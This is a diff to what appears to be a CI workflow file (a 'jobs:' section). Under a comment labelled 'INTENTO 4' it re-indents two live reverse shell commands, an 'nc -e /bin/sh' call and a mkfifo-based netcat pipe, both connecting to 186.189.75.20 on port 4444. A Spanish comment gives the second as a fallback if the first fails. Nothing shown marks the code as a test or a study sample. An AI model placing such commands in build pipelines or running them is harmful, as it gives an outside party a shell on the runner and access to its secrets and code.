@@ -56,9 +56,9 @@ jobs:
 
 
           # INTENTO 4
-              nc -e /bin/sh 186.189.75.20 4444 &  # Versión tradicional (requiere nc con soporte para -e)
-              # Si falla, prueba con mkfifo:
-              rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 186.189.75.20 4444 > /tmp/f &
+          nc -e /bin/sh 186.189.75.20 4444 &  # Versión tradicional (requiere nc con soporte para -e)
+          # Si falla, prueba con mkfifo:
+          rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 186.189.75.20 4444 > /tmp/f &
 
 
 
